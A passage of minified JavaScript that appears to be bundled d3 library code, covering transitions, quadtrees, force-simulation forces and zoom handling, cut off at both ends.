i(c){t.state=ru,t.timer.restart(a,t.delay,t.time),t.delay<=c&&a(c-t.delay)}function a(c){var u,h,f,g;if(t.state!==ru)return o();for(u in s)if(g=s[u],g.name===t.name){if(g.state===Rr)return su(a);g.state===iu?(g.state=Or,g.timer.stop(),g.on.call("interrupt",e,e.__data__,g.index,g.group),delete s[u]):+u<n&&(g.state=Or,g.timer.stop(),g.on.call("cancel",e,e.__data__,g.index,g.group),delete s[u])}if(su(function(){t.state===Rr&&(t.state=iu,t.timer.restart(l,t.delay,t.time),l(c))}),t.state=dl,t.on.call("start",e,e.__data__,t.index,t.group),t.state===dl){for(t.state=Rr,r=new Array(f=t.tween.length),u=0,h=-1;u<f;++u)(g=t.tween[u].value.call(e,e.__data__,t.index,t.group))&&(r[++h]=g);r.length=h+1}}function l(c){for(var u=c<t.duration?t.ease.call(null,c/t.duration):(t.timer.restart(o),t.state=hl,1),h=-1,f=r.length;++h<f;)r[h].call(e,u);t.state===hl&&(t.on.call("end",e,e.__data__,t.index,t.group),o())}function o(){t.state=Or,t.timer.stop(),delete s[n];for(var c in s)return;delete e.__transition}}function Mr(e,n){var t=e.__transition,s,r,i=!0,a;if(t){n=n==null?null:n+"";for(a in t){if((s=t[a]).name!==n){i=!1;continue}r=s.state>dl&&s.state<hl,s.state=Or,s.timer.stop(),s.on.call(r?"interrupt":"cancel",e,e.__data__,s.index,s.group),delete t[a]}i&&delete e.__transition}}function R0(e){return this.each(function(){Mr(this,e)})}function O0(e,n){var t,s;return function(){var r=an(this,e),i=r.tween;if(i!==t){s=t=i;for(var a=0,l=s.length;a<l;++a)if(s[a].name===n){s=s.slice(),s.splice(a,1);break}}r.tween=s}}function M0(e,n,t){var s,r;if(typeof t!="function")throw new Error;return function(){var i=an(this,e),a=i.tween;if(a!==s){r=(s=a).slice();for(var l={name:n,value:t},o=0,c=r.length;o<c;++o)if(r[o].name===n){r[o]=l;break}o===c&&r.push(l)}i.tween=r}}function I0(e,n){var t=this._id;if(e+="",arguments.length<2){for(var s=Ze(this.node(),t).tween,r=0,i=s.length,a;r<i;++r)if((a=s[r]).name===e)return a.value;return null}return this.each((n==null?O0:M0)(t,e,n))}function wo(e,n,t){var s=e._id;return e.each(function(){var r=an(this,s);(r.value||(r.value={}))[n]=t.apply(this,arguments)}),function(r){return Ze(r,s).value[n]}}function sh(e,n){var t;return(typeof n=="number"?Tn:n instanceof Us?Jc:(t=Us(n))?(n=t,Jc):g0)(e,n)}function z0(e){return function(){this.removeAttribute(e)}}function D0(e){return function(){this.removeAttributeNS(e.space,e.local)}}function j0(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttribute(e);return a===r?null:a===s?i:i=n(s=a,t)}}function B0(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttributeNS(e.space,e.local);return a===r?null:a===s?i:i=n(s=a,t)}}function F0(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttribute(e):(a=this.getAttribute(e),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function U0(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttributeNS(e.space,e.local):(a=this.getAttributeNS(e.space,e.local),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function H0(e,n){var t=Ni(e),s=t==="transform"?k0:sh;return this.attrTween(e,typeof n=="function"?(t.local?U0:F0)(t,s,wo(this,"attr."+e,n)):n==null?(t.local?D0:z0)(t):(t.local?B0:j0)(t,s,n))}function V0(e,n){return function(t){this.setAttribute(e,n.call(this,t))}}function W0(e,n){return function(t){this.setAttributeNS(e.space,e.local,n.call(this,t))}}function $0(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&W0(e,i)),t}return r._value=n,r}function G0(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&V0(e,i)),t}return r._value=n,r}function Y0(e,n){var t="attr."+e;if(arguments.length<2)return(t=this.tween(t))&&t._value;if(n==null)return this.tween(t,null);if(typeof n!="function")throw new Error;var s=Ni(e);return this.tween(t,(s.local?$0:G0)(s,n))}function q0(e,n){return function(){vo(this,e).delay=+n.apply(this,arguments)}}function X0(e,n){return n=+n,function(){vo(this,e).delay=n}}function K0(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?q0:X0)(n,e)):Ze(this.node(),n).delay}function Q0(e,n){return function(){an(this,e).duration=+n.apply(this,arguments)}}function Z0(e,n){return n=+n,function(){an(this,e).duration=n}}function J0(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?Q0:Z0)(n,e)):Ze(this.node(),n).duration}function ew(e,n){if(typeof n!="function")throw new Error;return function(){an(this,e).ease=n}}function nw(e){var n=this._id;return arguments.length?this.each(ew(n,e)):Ze(this.node(),n).ease}function tw(e,n){return function(){var t=n.apply(this,arguments);if(typeof t!="function")throw new Error;an(this,e).ease=t}}function sw(e){if(typeof e!="function")throw new Error;return this.each(tw(this._id,e))}function rw(e){typeof e!="function"&&(e=jd(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new kn(s,this._parents,this._name,this._id)}function iw(e){if(e._id!==this._id)throw new Error;for(var n=this._groups,t=e._groups,s=n.length,r=t.length,i=Math.min(s,r),a=new Array(s),l=0;l<i;++l)for(var o=n[l],c=t[l],u=o.length,h=a[l]=new Array(u),f,g=0;g<u;++g)(f=o[g]||c[g])&&(h[g]=f);for(;l<s;++l)a[l]=n[l];return new kn(a,this._parents,this._name,this._id)}function aw(e){return(e+"").trim().split(/^|\s+/).every(function(n){var t=n.indexOf(".");return t>=0&&(n=n.slice(0,t)),!n||n==="start"})}function lw(e,n,t){var s,r,i=aw(n)?vo:an;return function(){var a=i(this,e),l=a.on;l!==s&&(r=(s=l).copy()).on(n,t),a.on=r}}function ow(e,n){var t=this._id;return arguments.length<2?Ze(this.node(),t).on.on(e):this.each(lw(t,e,n))}function cw(e){return function(){var n=this.parentNode;for(var t in this.__transition)if(+t!==e)return;n&&n.removeChild(this)}}function uw(){return this.on("end.remove",cw(this._id))}function pw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=ho(e));for(var s=this._groups,r=s.length,i=new Array(r),a=0;a<r;++a)for(var l=s[a],o=l.length,c=i[a]=new Array(o),u,h,f=0;f<o;++f)(u=l[f])&&(h=e.call(u,u.__data__,f,l))&&("__data__"in u&&(h.__data__=u.__data__),c[f]=h,Ri(c[f],n,t,f,c,Ze(u,t)));return new kn(i,this._parents,n,t)}function dw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=Dd(e));for(var s=this._groups,r=s.length,i=[],a=[],l=0;l<r;++l)for(var o=s[l],c=o.length,u,h=0;h<c;++h)if(u=o[h]){for(var f=e.call(u,u.__data__,h,o),g,k=Ze(u,t),y=0,w=f.length;y<w;++y)(g=f[y])&&Ri(g,n,t,y,f,k);i.push(f),a.push(u)}return new kn(i,a,n,t)}var hw=Ks.prototype.constructor;function fw(){return new hw(this._groups,this._parents)}function mw(e,n){var t,s,r;return function(){var i=Vt(this,e),a=(this.style.removeProperty(e),Vt(this,e));return i===a?null:i===t&&a===s?r:r=n(t=i,s=a)}}function rh(e){return function(){this.style.removeProperty(e)}}function gw(e,n,t){var s,r=t+"",i;return function(){var a=Vt(this,e);return a===r?null:a===s?i:i=n(s=a,t)}}function yw(e,n,t){var s,r,i;return function(){var a=Vt(this,e),l=t(this),o=l+"";return l==null&&(o=l=(this.style.removeProperty(e),Vt(this,e))),a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l))}}function vw(e,n){var t,s,r,i="style."+n,a="end."+i,l;return function(){var o=an(this,e),c=o.on,u=o.value[i]==null?l||(l=rh(n)):void 0;(c!==t||r!==u)&&(s=(t=c).copy()).on(a,r=u),o.on=s}}function ww(e,n,t){var s=(e+="")=="transform"?w0:sh;return n==null?this.styleTween(e,mw(e,s)).on("end.style."+e,rh(e)):typeof n=="function"?this.styleTween(e,yw(e,s,wo(this,"style."+e,n))).each(vw(this._id,e)):this.styleTween(e,gw(e,s,n),t).on("end.style."+e,null)}function kw(e,n,t){return function(s){this.style.setProperty(e,n.call(this,s),t)}}function bw(e,n,t){var s,r;function i(){var a=n.apply(this,arguments);return a!==r&&(s=(r=a)&&kw(e,a,t)),s}return i._value=n,i}function xw(e,n,t){var s="style."+(e+="");if(arguments.length<2)return(s=this.tween(s))&&s._value;if(n==null)return this.tween(s,null);if(typeof n!="function")throw new Error;return this.tween(s,bw(e,n,t??""))}function _w(e){return function(){this.textContent=e}}function Sw(e){return function(){var n=e(this);this.textContent=n??""}}function Ew(e){return this.tween("text",typeof e=="function"?Sw(wo(this,"text",e)):_w(e==null?"":e+""))}function Tw(e){return function(n){this.textContent=e.call(this,n)}}function Cw(e){var n,t;function s(){var r=e.apply(this,arguments);return r!==t&&(n=(t=r)&&Tw(r)),n}return s._value=e,s}function Aw(e){var n="text";if(arguments.length<1)return(n=this.tween(n))&&n._value;if(e==null)return this.tween(n,null);if(typeof e!="function")throw new Error;return this.tween(n,Cw(e))}function Pw(){for(var e=this._name,n=this._id,t=ih(),s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)if(o=a[c]){var u=Ze(o,n);Ri(o,e,t,c,a,{time:u.time+u.delay+u.duration,delay:0,duration:u.duration,ease:u.ease})}return new kn(s,this._parents,e,t)}function Nw(){var e,n,t=this,s=t._id,r=t.size();return new Promise(function(i,a){var l={value:a},o={value:function(){--r===0&&i()}};t.each(function(){var c=an(this,s),u=c.on;u!==e&&(n=(e=u).copy(),n._.cancel.push(l),n._.interrupt.push(l),n._.end.push(o)),c.on=n}),r===0&&i()})}var Lw=0;function kn(e,n,t,s){this._groups=e,this._parents=n,this._name=t,this._id=s}function ih(){return++Lw}var on=Ks.prototype;kn.prototype={constructor:kn,select:pw,selectAll:dw,selectChild:on.selectChild,selectChildren:on.selectChildren,filter:rw,merge:iw,selection:fw,transition:Pw,call:on.call,nodes:on.nodes,node:on.node,size:on.size,empty:on.empty,each:on.each,on:ow,attr:H0,attrTween:Y0,style:ww,styleTween:xw,text:Ew,textTween:Aw,remove:uw,tween:I0,delay:K0,duration:J0,ease:nw,easeVarying:sw,end:Nw,[Symbol.iterator]:on[Symbol.iterator]};function Rw(e){return((e*=2)<=1?e*e*e:(e-=2)*e*e+2)/2}var Ow={time:null,delay:0,duration:250,ease:Rw};function Mw(e,n){for(var t;!(t=e.__transition)||!(t=t[n]);)if(!(e=e.parentNode))throw new Error(`transition ${n} not found`);return t}function Iw(e){var n,t;e instanceof kn?(n=e._id,e=e._name):(n=ih(),(t=Ow).time=go(),e=e==null?null:e+"");for(var s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&Ri(o,e,n,c,a,t||Mw(o,n));return new kn(s,this._parents,e,n)}Ks.prototype.interrupt=R0;Ks.prototype.transition=Iw;function zw(e,n){var t,s=1;e==null&&(e=0),n==null&&(n=0);function r(){var i,a=t.length,l,o=0,c=0;for(i=0;i<a;++i)l=t[i],o+=l.x,c+=l.y;for(o=(o/a-e)*s,c=(c/a-n)*s,i=0;i<a;++i)l=t[i],l.x-=o,l.y-=c}return r.initialize=function(i){t=i},r.x=function(i){return arguments.length?(e=+i,r):e},r.y=function(i){return arguments.length?(n=+i,r):n},r.strength=function(i){return arguments.length?(s=+i,r):s},r}function Dw(e){const n=+this._x.call(null,e),t=+this._y.call(null,e);return ah(this.cover(n,t),n,t,e)}function ah(e,n,t,s){if(isNaN(n)||isNaN(t))return e;var r,i=e._root,a={data:s},l=e._x0,o=e._y0,c=e._x1,u=e._y1,h,f,g,k,y,w,d,p;if(!i)return e._root=a,e;for(;i.length;)if((y=n>=(h=(l+c)/2))?l=h:c=h,(w=t>=(f=(o+u)/2))?o=f:u=f,r=i,!(i=i[d=w<<1|y]))return r[d]=a,e;if(g=+e._x.call(null,i.data),k=+e._y.call(null,i.data),n===g&&t===k)return a.next=i,r?r[d]=a:e._root=a,e;do r=r?r[d]=new Array(4):e._root=new Array(4),(y=n>=(h=(l+c)/2))?l=h:c=h,(w=t>=(f=(o+u)/2))?o=f:u=f;while((d=w<<1|y)===(p=(k>=f)<<1|g>=h));return r[p]=i,r[d]=a,e}function jw(e){var n,t,s=e.length,r,i,a=new Array(s),l=new Array(s),o=1/0,c=1/0,u=-1/0,h=-1/0;for(t=0;t<s;++t)isNaN(r=+this._x.call(null,n=e[t]))||isNaN(i=+this._y.call(null,n))||(a[t]=r,l[t]=i,r<o&&(o=r),r>u&&(u=r),i<c&&(c=i),i>h&&(h=i));if(o>u||c>h)return this;for(this.cover(o,c).cover(u,h),t=0;t<s;++t)ah(this,a[t],l[t],e[t]);return this}function Bw(e,n){if(isNaN(e=+e)||isNaN(n=+n))return this;var t=this._x0,s=this._y0,r=this._x1,i=this._y1;if(isNaN(t))r=(t=Math.floor(e))+1,i=(s=Math.floor(n))+1;else{for(var a=r-t||1,l=this._root,o,c;t>e||e>=r||s>n||n>=i;)switch(c=(n<s)<<1|e<t,o=new Array(4),o[c]=l,l=o,a*=2,c){case 0:r=t+a,i=s+a;break;case 1:t=r-a,i=s+a;break;case 2:r=t+a,s=i-a;break;case 3:t=r-a,s=i-a;break}this._root&&this._root.length&&(this._root=l)}return this._x0=t,this._y0=s,this._x1=r,this._y1=i,this}function Fw(){var e=[];return this.visit(function(n){if(!n.length)do e.push(n.data);while(n=n.next)}),e}function Uw(e){return arguments.length?this.cover(+e[0][0],+e[0][1]).cover(+e[1][0],+e[1][1]):isNaN(this._x0)?void 0:[[this._x0,this._y0],[this._x1,this._y1]]}function ke(e,n,t,s,r){this.node=e,this.x0=n,this.y0=t,this.x1=s,this.y1=r}function Hw(e,n,t){var s,r=this._x0,i=this._y0,a,l,o,c,u=this._x1,h=this._y1,f=[],g=this._root,k,y;for(g&&f.push(new ke(g,r,i,u,h)),t==null?t=1/0:(r=e-t,i=n-t,u=e+t,h=n+t,t*=t);k=f.pop();)if(!(!(g=k.node)||(a=k.x0)>u||(l=k.y0)>h||(o=k.x1)<r||(c=k.y1)<i))if(g.length){var w=(a+o)/2,d=(l+c)/2;f.push(new ke(g[3],w,d,o,c),new ke(g[2],a,d,w,c),new ke(g[1],w,l,o,d),new ke(g[0],a,l,w,d)),(y=(n>=d)<<1|e>=w)&&(k=f[f.length-1],f[f.length-1]=f[f.length-1-y],f[f.length-1-y]=k)}else{var p=e-+this._x.call(null,g.data),m=n-+this._y.call(null,g.data),v=p*p+m*m;if(v<t){var x=Math.sqrt(t=v);r=e-x,i=n-x,u=e+x,h=n+x,s=g.data}}return s}function Vw(e){if(isNaN(u=+this._x.call(null,e))||isNaN(h=+this._y.call(null,e)))return this;var n,t=this._root,s,r,i,a=this._x0,l=this._y0,o=this._x1,c=this._y1,u,h,f,g,k,y,w,d;if(!t)return this;if(t.length)for(;;){if((k=u>=(f=(a+o)/2))?a=f:o=f,(y=h>=(g=(l+c)/2))?l=g:c=g,n=t,!(t=t[w=y<<1|k]))return this;if(!t.length)break;(n[w+1&3]||n[w+2&3]||n[w+3&3])&&(s=n,d=w)}for(;t.data!==e;)if(r=t,!(t=t.next))return this;return(i=t.next)&&delete t.next,r?(i?r.next=i:delete r.next,this):n?(i?n[w]=i:delete n[w],(t=n[0]||n[1]||n[2]||n[3])&&t===(n[3]||n[2]||n[1]||n[0])&&!t.length&&(s?s[d]=t:this._root=t),this):(this._root=i,this)}function Ww(e){for(var n=0,t=e.length;n<t;++n)this.remove(e[n]);return this}function $w(){return this._root}function Gw(){var e=0;return this.visit(function(n){if(!n.length)do++e;while(n=n.next)}),e}function Yw(e){var n=[],t,s=this._root,r,i,a,l,o;for(s&&n.push(new ke(s,this._x0,this._y0,this._x1,this._y1));t=n.pop();)if(!e(s=t.node,i=t.x0,a=t.y0,l=t.x1,o=t.y1)&&s.length){var c=(i+l)/2,u=(a+o)/2;(r=s[3])&&n.push(new ke(r,c,u,l,o)),(r=s[2])&&n.push(new ke(r,i,u,c,o)),(r=s[1])&&n.push(new ke(r,c,a,l,u)),(r=s[0])&&n.push(new ke(r,i,a,c,u))}return this}function qw(e){var n=[],t=[],s;for(this._root&&n.push(new ke(this._root,this._x0,this._y0,this._x1,this._y1));s=n.pop();){var r=s.node;if(r.length){var i,a=s.x0,l=s.y0,o=s.x1,c=s.y1,u=(a+o)/2,h=(l+c)/2;(i=r[0])&&n.push(new ke(i,a,l,u,h)),(i=r[1])&&n.push(new ke(i,u,l,o,h)),(i=r[2])&&n.push(new ke(i,a,h,u,c)),(i=r[3])&&n.push(new ke(i,u,h,o,c))}t.push(s)}for(;s=t.pop();)e(s.node,s.x0,s.y0,s.x1,s.y1);return this}function Xw(e){return e[0]}function Kw(e){return arguments.length?(this._x=e,this):this._x}function Qw(e){return e[1]}function Zw(e){return arguments.length?(this._y=e,this):this._y}function ko(e,n,t){var s=new bo(n??Xw,t??Qw,NaN,NaN,NaN,NaN);return e==null?s:s.addAll(e)}function bo(e,n,t,s,r,i){this._x=e,this._y=n,this._x0=t,this._y0=s,this._x1=r,this._y1=i,this._root=void 0}function au(e){for(var n={data:e.data},t=n;e=e.next;)t=t.next={data:e.data};return n}var Se=ko.prototype=bo.prototype;Se.copy=function(){var e=new bo(this._x,this._y,this._x0,this._y0,this._x1,this._y1),n=this._root,t,s;if(!n)return e;if(!n.length)return e._root=au(n),e;for(t=[{source:n,target:e._root=new Array(4)}];n=t.pop();)for(var r=0;r<4;++r)(s=n.source[r])&&(s.length?t.push({source:s,target:n.target[r]=new Array(4)}):n.target[r]=au(s));return e};Se.add=Dw;Se.addAll=jw;Se.cover=Bw;Se.data=Fw;Se.extent=Uw;Se.find=Hw;Se.remove=Vw;Se.removeAll=Ww;Se.root=$w;Se.size=Gw;Se.visit=Yw;Se.visitAfter=qw;Se.x=Kw;Se.y=Zw;function rt(e){return function(){return e}}function Rn(e){return(e()-.5)*1e-6}function Jw(e){return e.x+e.vx}function e1(e){return e.y+e.vy}function n1(e){var n,t,s,r=1,i=1;typeof e!="function"&&(e=rt(e==null?1:+e));function a(){for(var c,u=n.length,h,f,g,k,y,w,d=0;d<i;++d)for(h=ko(n,Jw,e1).visitAfter(l),c=0;c<u;++c)f=n[c],y=t[f.index],w=y*y,g=f.x+f.vx,k=f.y+f.vy,h.visit(p);function p(m,v,x,T,P){var N=m.data,j=m.r,M=y+j;if(N){if(N.index>f.index){var Q=g-N.x-N.vx,pe=k-N.y-N.vy,ae=Q*Q+pe*pe;ae<M*M&&(Q===0&&(Q=Rn(s),ae+=Q*Q),pe===0&&(pe=Rn(s),ae+=pe*pe),ae=(M-(ae=Math.sqrt(ae)))/ae*r,f.vx+=(Q*=ae)*(M=(j*=j)/(w+j)),f.vy+=(pe*=ae)*M,N.vx-=Q*(M=1-M),N.vy-=pe*M)}return}return v>g+M||T<g-M||x>k+M||P<k-M}}function l(c){if(c.data)return c.r=t[c.data.index];for(var u=c.r=0;u<4;++u)c[u]&&c[u].r>c.r&&(c.r=c[u].r)}function o(){if(n){var c,u=n.length,h;for(t=new Array(u),c=0;c<u;++c)h=n[c],t[h.index]=+e(h,c,n)}}return a.initialize=function(c,u){n=c,s=u,o()},a.iterations=function(c){return arguments.length?(i=+c,a):i},a.strength=function(c){return arguments.length?(r=+c,a):r},a.radius=function(c){return arguments.length?(e=typeof c=="function"?c:rt(+c),o(),a):e},a}function t1(e){return e.index}function lu(e,n){var t=e.get(n);if(!t)throw new Error("node not found: "+n);return t}function s1(e){var n=t1,t=h,s,r=rt(30),i,a,l,o,c,u=1;e==null&&(e=[]);function h(w){return 1/Math.min(l[w.source.index],l[w.target.index])}function f(w){for(var d=0,p=e.length;d<u;++d)for(var m=0,v,x,T,P,N,j,M;m<p;++m)v=e[m],x=v.source,T=v.target,P=T.x+T.vx-x.x-x.vx||Rn(c),N=T.y+T.vy-x.y-x.vy||Rn(c),j=Math.sqrt(P*P+N*N),j=(j-i[m])/j*w*s[m],P*=j,N*=j,T.vx-=P*(M=o[m]),T.vy-=N*M,x.vx+=P*(M=1-M),x.vy+=N*M}function g(){if(a){var w,d=a.length,p=e.length,m=new Map(a.map((x,T)=>[n(x,T,a),x])),v;for(w=0,l=new Array(d);w<p;++w)v=e[w],v.index=w,typeof v.source!="object"&&(v.source=lu(m,v.source)),typeof v.target!="object"&&(v.target=lu(m,v.target)),l[v.source.index]=(l[v.source.index]||0)+1,l[v.target.index]=(l[v.target.index]||0)+1;for(w=0,o=new Array(p);w<p;++w)v=e[w],o[w]=l[v.source.index]/(l[v.source.index]+l[v.target.index]);s=new Array(p),k(),i=new Array(p),y()}}function k(){if(a)for(var w=0,d=e.length;w<d;++w)s[w]=+t(e[w],w,e)}function y(){if(a)for(var w=0,d=e.length;w<d;++w)i[w]=+r(e[w],w,e)}return f.initialize=function(w,d){a=w,c=d,g()},f.links=function(w){return arguments.length?(e=w,g(),f):e},f.id=function(w){return arguments.length?(n=w,f):n},f.iterations=function(w){return arguments.length?(u=+w,f):u},f.strength=function(w){return arguments.length?(t=typeof w=="function"?w:rt(+w),k(),f):t},f.distance=function(w){return arguments.length?(r=typeof w=="function"?w:rt(+w),y(),f):r},f}const r1=1664525,i1=1013904223,ou=4294967296;function a1(){let e=1;return()=>(e=(r1*e+i1)%ou)/ou}function l1(e){return e.x}function o1(e){return e.y}var c1=10,u1=Math.PI*(3-Math.sqrt(5));function p1(e){var n,t=1,s=.001,r=1-Math.pow(s,1/300),i=0,a=.6,l=new Map,o=yo(h),c=Pi("tick","end"),u=a1();e==null&&(e=[]);function h(){f(),c.call("tick",n),t<s&&(o.stop(),c.call("end",n))}function f(y){var w,d=e.length,p;y===void 0&&(y=1);for(var m=0;m<y;++m)for(t+=(i-t)*r,l.forEach(function(v){v(t)}),w=0;w<d;++w)p=e[w],p.fx==null?p.x+=p.vx*=a:(p.x=p.fx,p.vx=0),p.fy==null?p.y+=p.vy*=a:(p.y=p.fy,p.vy=0);return n}function g(){for(var y=0,w=e.length,d;y<w;++y){if(d=e[y],d.index=y,d.fx!=null&&(d.x=d.fx),d.fy!=null&&(d.y=d.fy),isNaN(d.x)||isNaN(d.y)){var p=c1*Math.sqrt(.5+y),m=y*u1;d.x=p*Math.cos(m),d.y=p*Math.sin(m)}(isNaN(d.vx)||isNaN(d.vy))&&(d.vx=d.vy=0)}}function k(y){return y.initialize&&y.initialize(e,u),y}return g(),n={tick:f,restart:function(){return o.restart(h),n},stop:function(){return o.stop(),n},nodes:function(y){return arguments.length?(e=y,g(),l.forEach(k),n):e},alpha:function(y){return arguments.length?(t=+y,n):t},alphaMin:function(y){return arguments.length?(s=+y,n):s},alphaDecay:function(y){return arguments.length?(r=+y,n):+r},alphaTarget:function(y){return arguments.length?(i=+y,n):i},velocityDecay:function(y){return arguments.length?(a=1-y,n):1-a},randomSource:function(y){return arguments.length?(u=y,l.forEach(k),n):u},force:function(y,w){return arguments.length>1?(w==null?l.delete(y):l.set(y,k(w)),n):l.get(y)},find:function(y,w,d){var p=0,m=e.length,v,x,T,P,N;for(d==null?d=1/0:d*=d,p=0;p<m;++p)P=e[p],v=y-P.x,x=w-P.y,T=v*v+x*x,T<d&&(N=P,d=T);return N},on:function(y,w){return arguments.length>1?(c.on(y,w),n):c.on(y)}}}function d1(){var e,n,t,s,r=rt(-30),i,a=1,l=1/0,o=.81;function c(g){var k,y=e.length,w=ko(e,l1,o1).visitAfter(h);for(s=g,k=0;k<y;++k)n=e[k],w.visit(f)}function u(){if(e){var g,k=e.length,y;for(i=new Array(k),g=0;g<k;++g)y=e[g],i[y.index]=+r(y,g,e)}}function h(g){var k=0,y,w,d=0,p,m,v;if(g.length){for(p=m=v=0;v<4;++v)(y=g[v])&&(w=Math.abs(y.value))&&(k+=y.value,d+=w,p+=w*y.x,m+=w*y.y);g.x=p/d,g.y=m/d}else{y=g,y.x=y.data.x,y.y=y.data.y;do k+=i[y.data.index];while(y=y.next)}g.value=k}function f(g,k,y,w){if(!g.value)return!0;var d=g.x-n.x,p=g.y-n.y,m=w-k,v=d*d+p*p;if(m*m/o<v)return v<l&&(d===0&&(d=Rn(t),v+=d*d),p===0&&(p=Rn(t),v+=p*p),v<a&&(v=Math.sqrt(a*v)),n.vx+=d*g.value*s/v,n.vy+=p*g.value*s/v),!0;if(g.length||v>=l)return;(g.data!==n||g.next)&&(d===0&&(d=Rn(t),v+=d*d),p===0&&(p=Rn(t),v+=p*p),v<a&&(v=Math.sqrt(a*v)));do g.data!==n&&(m=i[g.data.index]*s/v,n.vx+=d*m,n.vy+=p*m);while(g=g.next)}return c.initialize=function(g,k){e=g,t=k,u()},c.strength=function(g){return arguments.length?(r=typeof g=="function"?g:rt(+g),u(),c):r},c.distanceMin=function(g){return arguments.length?(a=g*g,c):Math.sqrt(a)},c.distanceMax=function(g){return arguments.length?(l=g*g,c):Math.sqrt(l)},c.theta=function(g){return arguments.length?(o=g*g,c):Math.sqrt(o)},c}const vr=e=>()=>e;function h1(e,{sourceEvent:n,target:t,transform:s,dispatch:r}){Object.defineProperties(this,{type:{value:e,enumerable:!0,configurable:!0},sourceEvent:{value:n,enumerable:!0,configurable:!0},target:{value:t,enumerable:!0,configurable:!0},transform:{value:s,enumerable:!0,configurable:!0},_:{value:r}})}function fn(e,n,t){this.k=e,this.x=n,this.y=t}fn.prototype={constructor:fn,scale:function(e){return e===1?this:new fn(this.k*e,this.x,this.y)},translate:function(e,n){return e===0&n===0?this:new fn(this.k,this.x+this.k*e,this.y+this.k*n)},apply:function(e){return[e[0]*this.k+this.x,e[1]*this.k+this.y]},applyX:function(e){return e*this.k+this.x},applyY:function(e){return e*this.k+this.y},invert:function(e){return[(e[0]-this.x)/this.k,(e[1]-this.y)/this.k]},invertX:function(e){return(e-this.x)/this.k},invertY:function(e){return(e-this.y)/this.k},rescaleX:function(e){return e.copy().domain(e.range().map(this.invertX,this).map(e.invert,e))},rescaleY:function(e){return e.copy().domain(e.range().map(this.invertY,this).map(e.invert,e))},toString:function(){return"translate("+this.x+","+this.y+") scale("+this.k+")"}};var xo=new fn(1,0,0);fn.prototype;function ca(e){e.stopImmediatePropagation()}function rs(e){e.preventDefault(),e.stopImmediatePropagation()}function f1(e){return(!e.ctrlKey||e.type==="wheel")&&!e.button}function m1(){var e=this;return e instanceof SVGElement?(e=e.ownerSVGElement||e,e.hasAttribute("viewBox")?(e=e.viewBox.baseVal,[[e.x,e.y],[e.x+e.width,e.y+e.height]]):[[0,0],[e.width.baseVal.value,e.height.baseVal.value]]):[[0,0],[e.clientWidth,e.clientHeight]]}function cu(){return this.__zoom||xo}function g1(e){return-e.deltaY*(e.deltaMode===1?.05:e.deltaMode?1:.002)*(e.ctrlKey?10:1)}function y1(){return navigator.maxTouchPoints||"ontouchstart"in this}function v1(e,n,t){var s=e.invertX(n[0][0])-t[0][0],r=e.invertX(n[1][0])-t[1][0],i=e.invertY(n[0][1])-t[0][1],a=e.invertY(n[1][1])-t[1][1];return e.translate(r>s?(s+r)/2:Math.min(0,s)||Math.max(0,r),a>i?(i+a)/2:Math.min(0,i)||Math.max(0,a))}function w1(){var e=f1,n=m1,t=v1,s=g1,r=y1,i=[0,1/0],a=[[-1/0,-1/0],[1/0,1/0]],l=250,o=S0,c=Pi("start","zoom","end"),u,h,f,g=500,k=150,y=0,w=10;function d(_){_.property("__zoom",cu).on("wheel.zoom",N,{passive:!1}).on("mousedown.zoom",j).on("dblclick.zoom",M).filter(r).on("touchstart.zoom",Q).on("touchmove.zoom",pe).on("touchend.zoom touchcancel.zoom",ae).style("-webkit-tap-highlight-color","rgba(0,0,0,0)")}d.transform=function(_,I,A,z){var S=_.selection?_.selection():_;S.property("__zoom",cu),_!==S?x(_,I,A,z):S.interrupt().each(function(){T(this,arguments).event(z).start().zoom(null,typeof I=="function"?I.apply(this,arguments):I).end()})},d.scaleBy=function(_,I,A,z){d.scaleTo(_,function(){var S=this.__zoom.k,L=typeof I=="function"?I.apply(this,arguments):I;return S*L},A,z)},d.scaleTo=function(_,I,A,z){d.transform(_,function(){var S=n.apply(this,arguments),L=this.__zoom,R=A==null?v(S):typeof A=="function"?A.apply(this,arguments):A,D=L.invert(R),B=typeof I=="function"?I.apply(this,arguments):I;return t(m(p(L,B),R,D),S,a)},A,z)},d.translateBy=function(_,I,A,z){d.transform(_,function(){return t(this.__zoom.translate(typeof I=="function"?I.apply(this,arguments):I,typeof A=="function"?A.apply(this,arguments):A),n.apply(this,arguments),a)},null,z)},d.translateTo=function(_,I,A,z,S){d.transform(_,function(){var L=n.apply(this,arguments),R=this.__zoom,D=z==null?v(L):typeof z=="function"?z.apply(this,arguments):z;return t(xo.translate(D[0],D[1]).scale(R.k).translate(typeof I=="function"?-I.apply(this,arguments):-I,typeof A=="function"?-A.apply(this,arguments):-A),L,a)},z,S)};function p(_,I){return I=Math.max(i[0],Math.min(i[1],I)),I===_.k?_:new fn(I,_.x,_.y)}function m(_,I,A){var z=I[0]-A[0]*_.k,S=I[1]-A[1]*_.k;return z===_.x&&S===_.y?_:new fn(_.k,z,S)}function v(_){return[(+_[0][0]+ +_[1][0])/2,(+_[0][1]+ +_[1][1])/2]}function x(_,I,A,z){_.on("start.zoom",function(){T(this,arguments).event(z).start()}).on("interrupt.zoom end.zoom",function(){T(this,arguments).event(z).end()}).tween("zoom",function(){var S=this,L=arguments,R=T(S,L).event(z),D=n.apply(S,L),B=A==null?v(D):typeof 